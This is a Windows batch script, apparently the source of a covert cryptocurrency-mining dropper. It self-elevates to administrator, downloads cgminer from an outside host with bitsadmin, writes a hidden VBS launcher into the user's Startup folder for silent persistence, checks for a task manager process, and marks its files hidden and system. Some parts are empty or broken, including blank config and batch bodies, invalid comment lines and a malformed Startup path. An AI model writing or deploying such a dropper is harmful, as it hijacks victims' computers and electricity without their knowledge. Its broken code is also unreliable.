@echo off
color c
title New Project "PhoenixMiner"

#New Version by Phoenixthrush

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

#mbr7362.bat                = Miner
#mbr5274.vbs                = Miner Autostart
#cgminer-3.7.2-windows.rar  = MinerFile

bitsadmin /transfer mydownloadjob /download /priority foreground "https://cryptomining-blog.com/wp-content/download/cgminer-3.7.2-windows.rar" "C:\Windows\Temp\cgminer-3.7.2-windows.zip"

cd C:\Windows\Temp\
powershell -command Expand-Archive C:\Windows\Temp\cgminer-3.7.2-windows.zip C:\Windows\Temp\cgminer-3.7.2-windows

cd C:\Windows\Temp\cgminer-3.7.2-windows\cgminer-3.7.2-windows
del cgminer.conf
>C:\Windows\Temp\cgminer-3.7.2-windows\cgminer-3.7.2-windows\cgminer.conf (

)

>C:\Windows\Temp\mbr7362.bat (
echo
echo
echo
echo
echo
echo
echo
echo
)

SETLOCAL EnableExtensions
set EXE=taskmanager.exe
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto FOUND
echo Not running
goto FIN
:FOUND
echo Running
:FIN

set temp=C:\Windows\Temp\
set name=mbr5274.vbs
set line1=Set WshShell = WScript.CreateObject( "WScript.Shell" )
set line2=WshShell.Run "C:\Windows\Temp\mbr7362.bat",0,True
echo %line1% >> %temp%%name%
echo %line2% >> %temp%%name%

cd C:\Windows\Temp\
copy mbr5274.vbs C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup
del mbr5274.vbs

cd C:\Windows\Temp\
attrib +r +s +h mbr7362.bat
attrib +r +s +h cgminer-3.7.2-windows.rar
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup
attrib +r +s +h mbr5274.vbs
